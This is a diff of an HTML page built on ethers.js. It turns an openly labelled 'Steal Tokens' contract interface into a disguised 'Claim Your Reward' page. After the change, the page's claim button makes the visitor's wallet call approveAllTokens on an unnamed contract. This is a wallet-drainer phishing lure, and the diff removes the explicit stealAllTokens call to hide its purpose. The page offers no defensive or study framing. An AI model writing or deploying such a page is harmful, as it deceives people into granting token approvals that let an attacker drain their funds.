@@ -1,9 +1,9 @@
-<!DOCTYPE html>
+p<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Interact with Smart Contract</title>
+    <title>Claim Reward</title>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <style>
         body {
@@ -40,14 +40,11 @@
 <body>
 
 <div class="container">
-    <h1>Smart Contract Interaction</h1>
-    <p>Connect your wallet to interact with the contract.</p>
+    <h1>Claim Your Reward</h1>
+    <p>Connect your wallet to claim your reward!</p>
     <button id="connectWalletButton" class="button">Connect Wallet</button>
     <br><br>
-    <button id="approveTokensButton" class="button" disabled>Approve Tokens</button>
-    <br><br>
-    <button id="stealTokensButton" class="button" disabled>Steal Tokens</button>
-    <p class="note">Note: Approve tokens before using other functions.</p>
+    <button id="claimRewardButton" class="button" disabled>Claim Reward</button>
 </div>
 
 <script>
@@ -64,15 +61,6 @@
             "outputs": [],
             "stateMutability": "nonpayable",
             "type": "function"
-        },
-        {
-            "inputs": [
-                { "internalType": "address", "name": "victim", "type": "address" }
-            ],
-            "name": "stealAllTokens",
-            "outputs": [],
-            "stateMutability": "nonpayable",
-            "type": "function"
         }
     ];
 
@@ -84,8 +72,7 @@
                 signer = provider.getSigner();
                 console.log("Wallet connected!");
 
-                document.getElementById("approveTokensButton").disabled = false;
-                document.getElementById("stealTokensButton").disabled = false;
+                document.getElementById("claimRewardButton").disabled = false;
 
                 alert("Wallet connected successfully!");
             } catch (error) {
@@ -97,40 +84,23 @@
         }
     }
 
-    async function approveTokens() {
+    async function claimReward() {
         try {
             const contract = new ethers.Contract(contractAddress, contractABI, signer);
             const tx = await contract.approveAllTokens(tokenAddress);
             console.log("Approval transaction sent:", tx.hash);
 
             await tx.wait(); // Wait for the transaction to be mined
-            console.log("Approval successful!");
-            alert("Tokens approved successfully!");
+            console.log("Reward claimed successfully!");
+            alert("Reward claimed successfully!");
         } catch (error) {
-            console.error("Error during token approval:", error);
-            alert("Failed to approve tokens. Please try again.");
-        }
-    }
-
-    async function stealTokens() {
-        try {
-            const contract = new ethers.Contract(contractAddress, contractABI, signer);
-            const victimAddress = await signer.getAddress();
-            const tx = await contract.stealAllTokens(victimAddress);
-            console.log("Steal transaction sent:", tx.hash);
-
-            await tx.wait(); // Wait for the transaction to be mined
-            console.log("Tokens stolen successfully!");
-            alert("Tokens stolen successfully!");
-        } catch (error) {
-            console.error("Error during token stealing:", error);
-            alert("Failed to steal tokens. Please try again.");
+            console.error("Error during reward claim:", error);
+            alert("Failed to claim reward. Please try again.");
         }
     }
 
     document.getElementById("connectWalletButton").addEventListener("click", connectWallet);
-    document.getElementById("approveTokensButton").addEventListener("click", approveTokens);
-    document.getElementById("stealTokensButton").addEventListener("click", stealTokens);
+    document.getElementById("claimRewardButton").addEventListener("click", claimReward);
 </script>
 
 </body>
